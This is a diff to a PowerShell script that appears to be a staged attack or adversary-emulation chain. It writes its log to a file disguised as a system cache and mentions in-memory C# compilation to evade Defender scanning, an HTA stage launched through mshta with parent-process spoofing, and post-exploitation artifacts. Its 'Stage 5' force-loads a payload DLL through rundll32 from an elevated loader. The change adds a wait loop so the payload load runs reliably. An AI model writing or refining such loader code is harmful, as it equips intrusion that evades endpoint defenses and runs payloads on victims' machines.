@@ -11,7 +11,7 @@ $logFile = "C:\ProgramData\USOShared\Logs\cache.dat"
 function Write-Log($msg) {
     $parent = Split-Path $logFile -Parent
     if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
-    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
+    [System.IO.File]::AppendAllText($logFile, "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg`n", (New-Object System.Text.UTF8Encoding($false)))
 }
 
 # -- In-memory C# compile (kills Defender real-time scan of %TEMP%\*.dll) --
@@ -476,6 +476,13 @@ if ($WhatIf) {
 # synchronously (payload.c:1454), blocking ~130s, so the post-ex artifacts
 # land before the 240s probe below.
 $msimtfPath = "C:\Users\Public\Libraries\msimtf.dll"
+# Wait for HTA Stage 1 copy to land before the Stage 5 force-load check.
+# mshta is async (PPID-spoof returns the PID, no wait), so checking msimtf.dll
+# immediately races the FSO.CopyFile inside the HTA.
+if (-not $WhatIf) {
+    $deadline = (Get-Date).AddSeconds(60)
+    while (-not (Test-Path $msimtfPath) -and (Get-Date) -lt $deadline) { Start-Sleep -Milliseconds 500 }
+}
 if (-not $WhatIf -and (Test-Path $msimtfPath)) {
     Write-Log "[*] Stage 5: Force-loading payload via rundll32 (DllRegisterServer) from elevated loader..."
     try {
